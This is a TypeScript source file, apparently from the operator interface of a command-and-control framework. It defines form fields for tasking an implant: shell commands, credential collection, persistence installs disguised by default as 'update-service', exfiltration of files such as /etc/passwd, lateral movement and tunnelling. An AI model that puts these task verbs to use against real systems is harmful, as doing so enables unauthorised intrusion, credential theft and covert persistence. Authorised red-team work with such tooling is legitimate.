// Per-verb dialog sugar for task issuance. The capability registry
// (GET /capabilities) stays the authority for which verbs exist and their
// OPSEC attributes; this module only knows the *argument grammar* the
// reference implant defines (the "<path> <base64>" shapes) so the operator UI
// can ask for labeled fields instead of one raw argument string. A verb
// without an entry here falls back to the generic raw-task form, so a
// registry addition never needs a UI change to stay issuable.

export interface VerbField {
  key: string
  label: string
  type?: 'text' | 'number' | 'file' | 'wide'
  placeholder?: string
  required?: boolean
  help?: string
}

// A file picked in a dialog: its name plus the bytes as base64 (and the byte
// count, so the upload path can pick inline vs staged).
export interface SelectedFile {
  name: string
  base64: string
  bytes: number
}

export interface BuiltTask {
  arguments: string
  // Base64 staged bytes (the issue route's Content arm); present only when
  // the arguments alone cannot carry the task.
  content?: string
}

export interface VerbForm {
  title: string
  fields: VerbField[]
  // Async because the staged upload arm hashes the bytes before it can name
  // them in the arguments string.
  build: (
    values: Record<string, string>,
    files: Record<string, SelectedFile>,
  ) => BuiltTask | Promise<BuiltTask>
}

// The inline ceiling the implant accepts inside its arguments string;
// anything larger must ride the staged arm.
const INLINE_FILE_LIMIT = 1024 * 1024

async function sha256Hex(base64: string): Promise<string> {
  const bytes = Uint8Array.from(atob(base64), (c) => c.charCodeAt(0))
  const digest = await crypto.subtle.digest('SHA-256', bytes)
  return [...new Uint8Array(digest)].map((b) => b.toString(16).padStart(2, '0')).join('')
}

const text = (value: string | undefined): string => (value ?? '').trim()

export const VERB_FORMS: Record<string, VerbForm> = {
  'shell.exec': {
    title: 'Run a shell command',
    fields: [{ key: 'command', label: 'Command', type: 'wide', required: true, placeholder: 'whoami' }],
    build: (values) => ({ arguments: text(values.command) }),
  },
  'file.pull': {
    title: 'Download a file',
    fields: [
      {
        key: 'path',
        label: 'Remote path',
        type: 'wide',
        required: true,
        placeholder: '/etc/hostname',
        help: 'Small files return inline in the task output; larger ones stream back as a downloadable artifact.',
      },
    ],
    build: (values) => ({ arguments: text(values.path) }),
  },
  'file.push': {
    title: 'Upload a file',
    fields: [
      { key: 'file', label: 'Local file', type: 'file', required: true },
      {
        key: 'path',
        label: 'Remote path',
        type: 'wide',
        required: true,
        placeholder: '/tmp/tool.exe',
        help: 'The remote absolute path the bytes land at. Larger uploads stage server-side and stream to the implant.',
      },
    ],
    // The implant's two upload arms: inline base64 in the arguments for small
    // files, staged bytes named by hash for large ones.
    build: async (values, files) => {
      const path = text(values.path)
      const file = files.file
      if (!file) return { arguments: path }
      if (file.bytes <= INLINE_FILE_LIMIT) return { arguments: `${path} ${file.base64}` }
      return { arguments: `${path} sha256:${await sha256Hex(file.base64)}`, content: file.base64 }
    },
  },
  'proc.kill': {
    title: 'Terminate a process',
    fields: [{ key: 'pid', label: 'PID', type: 'number', required: true, placeholder: '4242' }],
    build: (values) => ({ arguments: text(values.pid) }),
  },
  'beacon.sleep': {
    title: 'Retune the check-in cadence',
    fields: [
      {
        key: 'sleep',
        label: 'Check-in every',
        required: true,
        placeholder: '10s, 5m, or bare seconds (0 = back-to-back)',
        help: 'Go duration (30s, 5m) or bare seconds. 0 checks in continuously — the interactive-as-poll posture.',
      },
      {
        key: 'jitter',
        label: 'Randomize ±',
        placeholder: '2s — empty keeps the current jitter',
      },
    ],
    build: (values) => ({
      arguments: [text(values.sleep), text(values.jitter)].filter(Boolean).join(' '),
    }),
  },
  'recon.portscan': {
    title: 'Scan ports on a host',
    fields: [
      { key: 'host', label: 'Host', required: true, placeholder: '10.0.0.5' },
      { key: 'range', label: 'Port range', required: true, placeholder: '1-1024', help: 'Inclusive start-end.' },
    ],
    build: (values) => ({ arguments: `${text(values.host)} ${text(values.range)}` }),
  },
  'recon.service': {
    title: 'Probe services on a host',
    fields: [
      { key: 'host', label: 'Host', required: true, placeholder: '10.0.0.5' },
      { key: 'ports', label: 'Ports', required: true, placeholder: '22,80,443' },
    ],
    build: (values) => ({ arguments: `${text(values.host)} ${text(values.ports)}` }),
  },
  'collect.cred': {
    title: 'Collect credentials',
    fields: [
      {
        key: 'source',
        label: 'Store (optional)',
        placeholder: 'ssh, aws, or cmdkey',
        help: 'Empty enumerates every standard store the implant reaches.',
      },
    ],
    build: (values) => ({ arguments: text(values.source) }),
  },
  'lateral.move': {
    title: 'Derive a child implant',
    fields: [
      {
        key: 'token',
        label: 'Child stager token',
        type: 'wide',
        required: true,
        placeholder: 'the token the child redeems',
      },
      {
        key: 'klass',
        label: 'Class (optional)',
        placeholder: 'Pivot',
        help: 'Empty defaults to a stage-2 child.',
      },
    ],
    build: (values) => {
      const parts = [text(values.token), text(values.klass)].filter(Boolean)
      return { arguments: parts.join(' ') }
    },
  },
  'lateral.exec_remote': {
    title: 'Run a command on a remote host',
    fields: [
      { key: 'host', label: 'Host', required: true, placeholder: '10.0.0.6' },
      { key: 'command', label: 'Command', type: 'wide', required: true, placeholder: 'hostname' },
    ],
    build: (values) => ({ arguments: `${text(values.host)} ${text(values.command)}` }),
  },
  'persist.install': {
    title: 'Install persistence',
    fields: [
      {
        key: 'mechanism',
        label: 'Mechanism',
        required: true,
        placeholder: 'runkey, schtask, service, cron, or systemd',
      },
      { key: 'name', label: 'Name', required: true, placeholder: 'update-service' },
      {
        key: 'payload',
        label: 'Payload',
        type: 'wide',
        required: true,
        placeholder: 'the command or unit body the mechanism runs',
      },
    ],
    build: (values) => ({
      arguments: `${text(values.mechanism)} ${text(values.name)} ${text(values.payload)}`,
    }),
  },
  'persist.remove': {
    title: 'Remove persistence',
    fields: [
      { key: 'mechanism', label: 'Mechanism', required: true, placeholder: 'cron' },
      { key: 'name', label: 'Name', required: true, placeholder: 'update-service' },
    ],
    build: (values) => ({ arguments: `${text(values.mechanism)} ${text(values.name)}` }),
  },
  'exfil.push': {
    title: 'Exfiltrate a file',
    fields: [
      { key: 'name', label: 'Evidence name', required: true, placeholder: 'passwd-copy' },
      { key: 'path', label: 'Remote path', type: 'wide', required: true, placeholder: '/etc/passwd' },
    ],
    build: (values) => ({ arguments: `${text(values.name)} ${text(values.path)}` }),
  },
  'tunnel.forward': {
    title: 'Forward a tunnel',
    fields: [
      { key: 'host', label: 'Destination host', required: true, placeholder: '10.0.0.7' },
      { key: 'port', label: 'Destination port', type: 'number', required: true, placeholder: '3389' },
    ],
    build: (values) => ({ arguments: `${text(values.host)} ${text(values.port)}` }),
  },
}

// Verbs that need no arguments at all: the menu issues them directly (a
// confirm for the risky ones) instead of opening an empty form.
export const ZERO_ARG_VERBS: readonly string[] = [
  'recon.ps',
  'recon.hostenum',
  'collect.screenshot',
  'persist.list',
  'exfil.stage',
  'tunnel.socks',
]

// The verbs whose tasks run as live channels (the server's ChannelVerbs is the
// authority; the operator UI keeps this mirror so a channel task can offer its
// input pane). The input route refuses anything else server-side.
export const CHANNEL_VERBS: readonly string[] = [
  'shell.interact',
  'tunnel.forward',
  'tunnel.socks',
]

// Reads a picked file into the SelectedFile shape: the dialog calls it on
// change and keeps the result in state until submit.
export async function readSelectedFile(file: globalThis.File): Promise<SelectedFile> {
  const bytes = new Uint8Array(await file.arrayBuffer())
  let binary = ''
  const chunk = 0x8000
  for (let i = 0; i < bytes.length; i += chunk) {
    binary += String.fromCharCode(...bytes.subarray(i, i + chunk))
  }
  return { name: file.name, base64: btoa(binary), bytes: bytes.length }
}
